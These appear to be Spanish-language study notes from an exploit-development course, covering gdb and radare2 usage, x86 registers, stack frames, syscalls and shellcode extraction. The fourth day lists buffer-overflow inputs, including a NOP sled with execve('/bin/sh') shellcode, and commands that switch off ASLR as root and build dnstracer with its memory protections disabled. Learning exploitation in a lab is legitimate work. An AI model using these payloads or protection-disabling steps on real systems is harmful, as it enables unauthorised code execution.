
apt install gcc-multilib
apt install cmake build-essential libboost-dev git
dpkg --add-architecture i386
apt install nasm

# Compilar asm para 32 bits
nasm -f elf32 -o $fuente.obj $fuente.asm && ld -m elf_i386 -o $fuente $fuente.obj

# Para shell (shellcode generado)
nasm -f elf32 -o $fuente.obj $fuente.asm && ld -N -m elf_i386 -o $fuente $fuente.obj

gdb archivo -q

(gdb) info functions
(gdb) r -> run
(gdb) b _start -> breackpoint
(gdb) layout asm
(gdb) layout regs
(gdb) si -> stepi -> siguiente instrucción
(gdb) <enter> -> para repetir instrucción
(gdb) x/x dir_memoria -> x - examinar, x - hexadecimal
(gdb) x/s dir_memoria -> x - examinar, s - string
(gdb) x/d dir_memoria -> x - examinar, d - entero
(gdb) continue -> para terminar la función
(gdb) i r ecx -> ver el valor de un registro

Para cambiar la nomenclatura de gdb:

echo "set disassembly-flavor intel" > ~/.gdbinit



* Registros:
4 de proposito general
todos empiezan con e de extended

eax 
ebx - apuntador 
ecx - registro contador
edx - 

sin la e solo tienen 16 bits, y cada uno tiene parte baja y alta (h y l)


.text
.data
.ro data

=============================== dia 2 ===============================

ebp -> pointer base stack
esp -> pointer tope stack
eip ->  instruction pointer

gcc test.c -o testc -m32 -fno-pic -z execstack -mpreferred-stack-boundary=2 -fno-stack-protector


(gdb) info functions
(gdb) info registers
(gdb) disas <funcion>
(gdb) x/x $esp -> checar el estado de la pila

leave -> mov esp, ebp   |                                                                       |
         pop ebp        | ----> regresa al frame anterior                                       |
                                                                                                |---> epílogo
ret -> pop eip |----> regresa a la instrucción donde se quedó antes de llamar a una función     |

(gdb) ni -> salta la siguiente instrucción después de llamar a una función

call -> prologo |-> push ebp -> guarda el marco de quien lo llamó
                |   mov ebp, esp -> generar un nuevo marco de pila


shellcode -> secuencia de bytes que representa instrucciones asm


***************** Nota:
cuando se hace una syscall, aex toma el número de la llamada a la función, y los argumentos los toma de la siguiente forma
e.g.
write(fd, buff, len_buff)
eax -> write -> 4
ebx -> arg1 -> fd
ecx -> arg2 -> buff
edx -> arg3 -> len_buff

objdump -d -M intel salida -> para ver el shellcode

objdump -d -j .text callexit | grep -e '^ ' | tr '[[:space:]]' '\n' | egrep '^[[:alnum:]]{2}$' | xargs | sed 's/ /\\x/g' | sed -e 's/^/\\x/g'     ----->    para filtrar el shellcode 

lea -> load effective address

================================== dia 3 ==================================

rabin2 -l binario -> bibliotecas
rabin2 -I binario -> info archivo
rabin2 -zqq binario -> cadenas

objdump -M intel -d <binario>

radare2 binario
|
|- aa
|- aaa -> para ver todo el binario
|- s main -> posicionarse en esa parte del codigo
|- pd <num lineas> -> para ver que si estamos situados donde queremos
|- vv -> entra a modo visual

test compara 2 registros -> es similar a and, pero no guarda el resultado en el primer registro, activa bandera zero

================================== Dia 4 ==================================

r <<< `python -c "print 'A' * 30 + 'B' * 4 + '\x5d\x55\x55\x56'"`
ctrl+xa -> para salir de los registros

* mecanismo ASLR
/proc/sys/kernel/randomize_va_space -> cambiarlo por un 0 para quitar el mecanismo de protección de binarios para que no aleatorice las direcciones de memoria
echo 0 > /proc/sys/kernel/randomize_va_space -> como root

// Para serial.c
r <<< `python -c "print 'A' * 24 + 'B' * 4 + '\x29\x57\x55\x56'"`

// Para overflow3
r `python -c "print '\x90' * 128 + 'B' * 4 + 'CCCC'"`

r `python -c "print '\x90' * 79 + '\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b' + 'B' * 4  + '\x7c\xcf\xff\xff'"`


----------------------- Ubuntu 12.04

http://www.mavetju.org/download/dnstracer-1.8.tar.gz

descomprimirlo, ejecutar el configure, si falla instalar dependencias (build-essential, libncurses5-dev)

modificar linea en Makefile:
CC = gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack
